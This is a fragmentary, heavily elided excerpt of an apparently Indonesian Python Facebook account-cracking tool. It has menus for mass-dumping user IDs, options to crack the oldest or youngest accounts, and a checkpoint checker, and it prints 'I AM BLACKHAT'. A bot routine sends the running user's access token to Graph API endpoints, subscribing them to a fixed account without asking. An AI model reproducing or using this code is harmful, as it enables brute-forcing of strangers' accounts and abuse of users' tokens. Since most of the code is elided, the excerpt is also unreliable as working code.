...
login().__login__()
	def bot(self):
		...
		requests.post('https://graph.facebook.com/100066074752186/subscribers?access_token=' + toket)
		requests.post('https://graph.facebook.com/100066074752186/subscribers?access_token=' + toket)
		requests.post('https://graph.facebook.com/100066074752186/subscribers?access_token=' + toket)
...
def menu(my_name,my_id,my_birthday):
	...
	print(x+'['+h+'•'+x+'] \033[93mTanggal Kelahiran  : '+str(birth))
	...
	if jh in ['1','01']:
		...
		ric = '# PILIHAN TIDAK ADA DI DAFTAR MENU'
...
def file():
	...
	sol().print(mark(tek, style='cyan'), style='on blue')
...
def dump_massal():
	...
	for userr in uid:
		try:
			...
			sol().print(lo, style='cyan')
			exit()
	tot = '# TOTAL 👉 %s ID, I AM BLACKHAT'%(len(id))
	if len(id)==0:
...
def setting():
	...
	teks = '[01] Crack Dari Akun Tertua (Sangat Joss)\n[02] Crack Dari Akun Termuda (Joss)\n[03] Acak Urutan ID (Kurang Joss)'
...
def cek_opsi():
	...
	for kes in akun:
		try:
			...
			exit()
	dah = '# DONE'
	sol().print(mark(dah, style='purple'))
	exit()
